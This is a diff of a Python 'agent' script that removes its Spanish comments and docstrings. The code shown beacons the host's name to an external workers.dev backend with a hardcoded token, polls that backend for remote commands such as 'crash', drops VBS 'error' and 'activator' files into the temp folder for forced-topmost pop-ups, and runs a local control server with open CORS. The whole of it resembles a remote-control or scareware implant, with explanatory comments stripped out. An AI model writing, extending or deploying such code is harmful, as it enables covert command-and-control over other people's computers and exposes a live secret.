@@ -12,7 +12,6 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 
 PORT = 5005
 
-# Token de autenticación compartido con el servidor de logs/auth
 AGENT_TOKEN = "ed81f9a6ad3fe1ba5587430863c983c2ea2c77239a158fa7"
 LOG_AUTH_URL = "https://telelluc-log-auth.mrocadlectric.workers.dev"
 HEARTBEAT_INTERVAL_SECONDS = 20
@@ -20,9 +19,6 @@ COMMAND_CHECK_INTERVAL_SECONDS = 5
 
 device_id = None
 
-# ---------------------------------------------------------------------------
-# RUTINAS DE NOTIFICACIÓN Y COMPONENTES DE INTERFAZ
-# ---------------------------------------------------------------------------
 ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
 ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")
 
@@ -83,11 +79,7 @@ def show_error():
     _force_topmost()
 
 
-# ---------------------------------------------------------------------------
-# BUCLE DE INVENTARIO Y LATIDOS (REGISTRO EN EL BACKEND)
-# ---------------------------------------------------------------------------
 def heartbeat_loop():
-    """Envia de forma periódica el nombre de host para registrar la conexión en el backend."""
     global device_id
     hostname = socket.gethostname()
     payload = json.dumps({"hostname": hostname}).encode("utf-8")
@@ -111,7 +103,6 @@ def heartbeat_loop():
 
 
 def command_check_loop():
-    """Consulta periódicamente si hay comandos pendientes (como 'crash')."""
     global device_id
     while True:
         if device_id is None:
@@ -133,9 +124,6 @@ def command_check_loop():
         time.sleep(COMMAND_CHECK_INTERVAL_SECONDS)
 
 
-# ---------------------------------------------------------------------------
-# SERVIDOR HTTP LOCAL (ENDPOINT CONTROL)
-# ---------------------------------------------------------------------------
 class Handler(BaseHTTPRequestHandler):
     def _cors(self):
         self.send_header("Access-Control-Allow-Origin", "*")
@@ -160,13 +148,9 @@ class Handler(BaseHTTPRequestHandler):
 
 
 if __name__ == "__main__":
-    # Inicia el hilo persistente de reporte al backend central
     threading.Thread(target=heartbeat_loop, daemon=True).start()
-
-    # Inicia el hilo que consulta comandos pendientes (crash, etc)
     threading.Thread(target=command_check_loop, daemon=True).start()
 
-    # Servidor local para peticiones de control de interfaz
     server = HTTPServer(("127.0.0.1", PORT), Handler)
     print(f"[*] Agente escuchando peticiones de interfaz en http://127.0.0.1:{PORT} ...", flush=True)
 
